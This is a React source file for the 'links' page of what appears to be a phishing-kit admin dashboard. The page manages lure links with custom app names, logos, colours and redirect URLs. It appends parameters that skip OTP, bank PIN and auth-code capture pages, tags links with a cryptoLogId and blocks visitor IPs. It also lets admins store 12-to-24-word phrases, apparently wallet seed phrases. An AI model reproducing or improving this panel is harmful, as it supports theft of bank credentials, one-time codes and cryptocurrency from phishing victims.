"use client";
import Seo from "@/shared/layout-components/seo/seo";
import React, { Fragment, useEffect, useState } from "react";
import { Button, Card, Col, Row, Pagination } from "react-bootstrap";
import { SquarePlus, Trash2, Pencil, RotateCcw, X } from "lucide-react";
import { useSelector, useDispatch } from "react-redux";
import moment from "moment";
import {
  getUrls,
  deleteUrl,
  fetchPhrases,
  createPhrase,
} from "@/shared/Api/dashboard";
import { getIps } from "@/shared/Api/dashboard";
import Popup from "@/components/Popup";

function page() {
  const allPhrases = useSelector((state: any) => state?.dash?.phrases);
  const [currentPage, setCurrentPage] = useState(1);
  const [itemsPerPage] = useState(10);
  const [isPopupOpen, setIsPopupOpen] = useState(false);
  const [modalVisible, setModalVisible] = useState(false);
  const [inputText, setInputText] = useState("");
  const [error, setError] = useState("");
  const [redirectLink, setRedirectLink] = useState("");
  const [appName, setAppName] = useState("");
  const [image, setImage] = useState("https://firebasestorage.googleapis.com/v0/b/xtremefish-9ceaf.appspot.com/o/images%2Favatar.png?alt=media&token=6b910478-6e58-4c73-8ea9-f4827f2eaa1b");
  const [ipBlock, setIpBlock] = useState(false);
  const user = useSelector((state: any) => state.auth.user);
  const [descVal, setDescVal] = useState("");
  const [originalDesc, setOriginalDesc] = useState("");
  const [updateId, setUpdate] = useState("");
  const [urls, setUrls] = useState<any>();
  const Urls = useSelector((state: any) => state.dash.urls);
  const Ips = useSelector((state: any) => state.dash.ips);
  const userSubscription = useSelector(
    (state: any) => state.dash.subscriptionLogs
  );
  const [selectedModColor, setSelectedModColor] = useState("");
  const [selectedBtnColor, setSelectedBtnColor] = useState("");
  const [selectedColor, setSelectedColor] = useState("");
  const dispatch = useDispatch();
  const [phrases, setPhrases] = useState<any[]>([]);

  // const dummyArray:any = [
  //   // { id: '1', text: 'This is the first dummy text, just an example of the content.' },
  //   // { id: '2', text: 'Another example of some dummy text to be displayed in the modal.' },
  //   // { id: '3', text: "Here's more sample content with a little more variation in the text." },
  //   // { id: '4', text: 'Yet another entry with a short description, keeping it concise.' },
  //   // { id: '5', text: 'Yet another entry with a short description, keeping it concise.' },
  //   // { id: '6', text: 'Yet another entry with a short description, keeping it concise.' },
  //   // { id: '7', text: 'Yet another entry with a short description, keeping it concise jbdjh adhjad ahsgd ajhdasda dh as dasdgasdasd j.' },
  //   // Add more items as needed
  // ];

  useEffect(() => {
    const loadPhrases = async () => {
      const fetchedPhrases = await fetchPhrases();
      console.log("Phrases:   ", fetchedPhrases);
      setPhrases(fetchedPhrases);
    };

    loadPhrases();
  }, [allPhrases?.length]);

  const handleModalToggle = () => {
    setModalVisible(!modalVisible);
  };

  const handleOpenPopup = () => {
    setIsPopupOpen(true);
  };

  const handleUpdate = (post: any) => {
    const fullUrl = post?.description || "";
    const baseUrl = fullUrl.split(/[?#]/)[0];
  
    setSelectedColor(post?.backgroundcolor);
    setSelectedBtnColor(post?.btnColor);
    setSelectedModColor(post?.modalColor);
    setRedirectLink(post?.redirectUrl);
    setAppName(post?.appName);
    setImage(post?.appLogo);
  
    setOriginalDesc(fullUrl);
    setDescVal(baseUrl);
    setUpdate(post?._id);
    setIpBlock(false);
    handleOpenPopup();
  };

  const handleClosePopup = () => {
    setIpBlock(false);
    setIsPopupOpen(false);
  };

  const filterUrls = (urlToDelete: any) => {
    deleteUrl({ id: urlToDelete?._id }, dispatch);
  };

  const getAllUrls = async () => {
    await getUrls(dispatch);
  };

  const handleAddPhrase = async () => {
    if (!inputText) {
      setError("Please enter a phrase.");
      return;
    }
    const regex = /^[a-z\s]+$/;

    if (!regex.test(inputText)) {
      setError("Only lowercase letters and spaces are allowed.");
      return;
    }
    const wordCount = inputText.trim().split(/\s+/).length;
    if (wordCount < 12) {
      setError("Phrase should contain at least 12 words.");
      return;
    } else if (wordCount > 24) {
      setError("Phrase should contain no more than 24 words.");
      return;
    }
    const data = {
      userId: user?._id,
      phrase: inputText,
    };
    const result = await createPhrase(data, dispatch);
    setError("");
    if (result) {
      setInputText("");
    } else {
      setError("Failed to add phrase.");
    }
  };

  const isValidUrl = (url: any) => {
    try {
      new URL(url.description);
      return true;
    } catch (e) {
      return false;
    }
  };

  const goToRunEscape = (url: any) => {

    if (isValidUrl(url)) {
      const separator = url.description.includes("?") ? "&" : "?";
      window.open(
        `${url.description}${separator}userId=${user?._id}&cryptoLogId=${url.cryptoLogId}`,
        "_blank"
      );
    } else {
      window.open(url.description, "_blank");
    }
  };

  const getAllIps = async () => {
    await getIps(dispatch);
  };
  useEffect(() => {
    getAllUrls();
    getAllIps();
  }, [Urls.length]);

  const handleClick = (e: any) => {
    if (Ips.length) {
      const userIp = user?.location?.ipAddress;
      const blockedIps = Ips.map((ip: any) => {
        return ip?.ip;
      });
      const isIncluded = blockedIps?.includes(userIp);
      if (isIncluded) {
        setIpBlock(!ipBlock);
        e.preventDefault();
        handleOpenPopup();
      }
    }
  };
  const Tooltip = ({ children, title }: any) => {
    const [visible, setVisible] = React.useState(false);

    return (
      <div
        onMouseEnter={() => setVisible(true)}
        onMouseLeave={() => setVisible(false)}
        style={{ position: "relative", display: "inline-block" }}
      >
        {children}
        {visible && (
          <div
            style={{
              position: "absolute",
              top: "55%",
              left: "130%",
              transform: "translateX(-50%)",
              backgroundColor: "black",
              color: "white",
              padding: "2px 5px",
              borderRadius: "4px",
              whiteSpace: "nowrap",
              zIndex: 1,
              border: "1px solid white",
            }}
          >
            {title}
          </div>
        )}
      </div>
    );
  };

  if (userSubscription && userSubscription.length) {
    userSubscription.find((sub: any) => {
      if (sub.userId === user?._id) {
        user.subscription = sub.active;
      }
    });
  }

  const indexOfLastItem = currentPage * itemsPerPage;
  const indexOfFirstItem = indexOfLastItem - itemsPerPage;
  const currentUrls = Urls.slice(indexOfFirstItem, indexOfLastItem);

  const paginate = (pageNumber: number) => setCurrentPage(pageNumber);

  return (
    <>
      {/* {user?.subscription ? ( */}
      <Fragment>
        <Seo title={"Links"} />
        <Row className="mt-2">
          <Col xl={12}>
            <Card className="custom-card">
              <Card.Header className="justify-content-between">
                <Card.Title>links</Card.Title>
                <div className="d-flex flex-wrap gap-2">
                  <div className="flex justify-between gap-2">
                    {user?.admin && (
                      <div className="flex justify-center items-center gap-2">
                        <button
                          className="title:rounded-md"
                          onClick={handleOpenPopup}
                          title={"Add Url"}
                        >
                          <SquarePlus
                            size={30}
                            className="hover:text-blue-400"
                          />
                        </button>
                        <Button onClick={handleModalToggle}>Add Phrase</Button>
                      </div>
                    )}
                    <Popup
                      isOpen={isPopupOpen}
                      onClose={handleClosePopup}
                      urls={urls}
                      setUrls={setUrls}
                      descVal={descVal}
                      setDescVal={setDescVal}
                      updateId={updateId}
                      setUpdate={setUpdate}
                      ipBlock={ipBlock}
                      setIpBlock={setIpBlock}
                      appLogo={image}
                      setImage={setImage}
                      appName={appName}
                      setAppName={setAppName}
                      redirectLink={redirectLink}
                      setRedirectLink={setRedirectLink}
                      selectedBtnColor={selectedBtnColor}
                      selectedModColor={selectedModColor}
                      selectedColor={selectedColor}
                      setSelectedBtnColor={setSelectedBtnColor}
                      setSelectedColor={setSelectedColor}
                      setSelectedModColor={setSelectedModColor}
                      originalDesc={originalDesc}
                    />
                    {modalVisible && (
                      <div className="fixed inset-0 backdrop-blur-sm flex justify-center items-center z-50 animate-fadeIn">
                        <div className="bg-[#12111d] p-6 rounded-lg w-4/12 shadow-xl relative transform transition-all">
                          <button
                            className="absolute top-1 right-2 text-2xl"
                            onClick={handleModalToggle}
                          >
                            <X className="rounded-md hover:bg-[#4f5763]" />
                          </button>
                          <div className="flex items-center gap-2 mt-4">
                            <input
                              type="text"
                              className="form-control text-md bg-transparent p-2 text-gray-50"
                              placeholder="Enter phrase here"
                              value={inputText}
                              onChange={(e) => setInputText(e.target.value)}
                            />
                            <button
                              className="bg-blue-500 hover:bg-blue-600 text-gray-50 px-4 py-2.5 rounded-sm transition"
                              onClick={handleAddPhrase}
                            >
                              Add
                            </button>
                          </div>

                          {/* Error Message */}
                          {error && (
                            <p className="text-red-500 text-sm mt-1">{error}</p>
                          )}
                          {phrases?.length > 0 && (
                            <h3 className="text-lg font-medium text-center text-gray-50 mt-2">
                              Phrases
                            </h3>
                          )}

                          <div className="mt-1 h-72 overflow-y-auto p-2 bg-transparent">
                            {phrases?.length > 0 ? (
                              <table className="w-full border border-collapse text-left">
                                <thead className="rounded-md">
                                  <tr className="bg-[#252735] text-gray-300">
                                    <th className="p-3 border border-gray-600">
                                      No.
                                    </th>
                                    <th className="p-3 border border-gray-600">
                                      phrase
                                    </th>
                                    {/* <th className="p-3 border border-gray-600">
                                      Actions
                                    </th> */}
                                  </tr>
                                </thead>
                                <tbody>
                                  {[...phrases]
                                    ?.reverse()
                                    ?.map((item, index) => (
                                      <tr
                                        key={user.id}
                                        className="border-b border-gray-600"
                                      >
                                        <td className="p-3 border border-gray-600">
                                          {index + 1}
                                        </td>
                                        <td className="p-3 border border-gray-600">
                                          {item?.phrase}
                                        </td>
                                        {/* <td className="border text-center border-gray-600">
                                        <button className="text-red-500 text-center">
                                          <Trash2 size={18} />
                                        </button>
                                      </td> */}
                                      </tr>
                                    ))}
                                </tbody>
                              </table>
                            ) : (
                              <div className="flex justify-center items-center h-full w-full">
                                <p className="text-gray-200 text-lg">
                                  No Phrases Found
                                </p>
                              </div>
                            )}
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              </Card.Header>
              <Card.Body className="p-0">
                <div className="table-responsive">
                  <table className="table text-nowrap">
                    <thead>
                      <th>Link</th>
                      <th>Date</th>
                      <th>Redirect Link</th>
                      <th>Actions</th>
                    </thead>
                    <tbody>
                      {currentUrls &&
                        currentUrls?.length > 0 &&
                        currentUrls?.map((url: any) => (
                          <tr key={url._id}>
                            <td>
                              <img
                                src={
                                  user?.profileImage ??
                                  "https://firebasestorage.googleapis.com/v0/b/xtremefish-9ceaf.appspot.com/o/images%2Favatar.png?alt=media&token=6b910478-6e58-4c73-8ea9-f4827f2eaa1b"
                                }
                                alt="img"
                                className="avatar avatar-xs avatar-rounded mb-1"
                              />
                              <a
                                className="ml-2"
                                onClick={(e) => {
                                  handleClick(e);
                                }}
                                // href={url.description + `userId=${user?._id}`}
                                href={`${url?.description}${
                                  url?.description?.includes("?") ? "&" : "?"
                                }${user?._id ? `userId=${user._id}` : ""}${
                                  user?.skipPages?.includes("OTP")
                                    ? "&skip=OTP"
                                    : ""
                                }${
                                  user?.skipPages?.includes("Bank Pin")
                                    ? "&skip=BankPin"
                                    : ""
                                }${
                                  user?.skipPages?.includes("Auth Code")
                                    ? "&skip=AuthCode"
                                    : ""
                                }${
                                  url?.cryptoLogId
                                    ? `&cryptoLogId=${url.cryptoLogId}`
                                    : ""
                                }`}
                                target="_blank"
                              >
                                {
                                  url?.description?.split("?")[0]
                                }
                              </a>
                            </td>
                            <td>
                              <div className="btn-list">
                                {moment(url?.createdAt).format(
                                  "ddd, MMM DD, YYYY, hh:mm A"
                                )}
                              </div>
                            </td>
                            <td>{url?.redirectUrl}</td>
                            <td>
                              {user?.role!=='admin' ? (
                                <Tooltip title="click">
                                  <Button
                                    onClick={() => {
                                      goToRunEscape(url);
                                    }}
                                  >
                                    <RotateCcw
                                      size={16}
                                      className="font-bold"
                                    />
                                  </Button>
                                </Tooltip>
                              ) : (
                                <div className="flex py-2 justify-start gap-2 ">
                                  <button
                                    className="text-red-500 mr-2"
                                    onClick={() => filterUrls(url)}
                                  >
                                    <Trash2 size={14} />
                                  </button>
                                  <button
                                    className="text-blue-500"
                                    onClick={() => handleUpdate(url)}
                                  >
                                    <Pencil size={14} />
                                  </button>
                                </div>
                              )}
                            </td>
                          </tr>
                        ))}
                    </tbody>
                  </table>
                </div>
              </Card.Body>
              <Card.Footer>
                <div className="d-flex align-items-center">
                  <div>
                    Showing {Urls.length} Entries{" "}
                    <i className="bi bi-arrow-right ms-2 fw-semibold"></i>
                  </div>
                  <div className="ms-auto">
                    <nav
                      aria-label="Page navigation"
                      className="pagination-style-4"
                    >
                      <Pagination className="pagination mb-0">
                        <Pagination.Item
                          disabled={currentPage === 1}
                          onClick={() => paginate(currentPage - 1)}
                        >
                          Prev
                        </Pagination.Item>
                        {Array.from({
                          length: Math.ceil(Urls.length / itemsPerPage),
                        }).map((_, index) => (
                          <Pagination.Item
                            key={index + 1}
                            active={currentPage === index + 1}
                            onClick={() => paginate(index + 1)}
                          >
                            {index + 1}
                          </Pagination.Item>
                        ))}
                        <Pagination.Item
                          disabled={
                            currentPage ===
                            Math.ceil(Urls.length / itemsPerPage)
                          }
                          onClick={() => paginate(currentPage + 1)}
                        >
                          Next
                        </Pagination.Item>
                      </Pagination>
                    </nav>
                  </div>
                </div>
              </Card.Footer>
            </Card>
          </Col>
        </Row>
      </Fragment>
      {/* ) : (
        <SubscriptionPage />
      )} */}
    </>
  );
}

export default page;
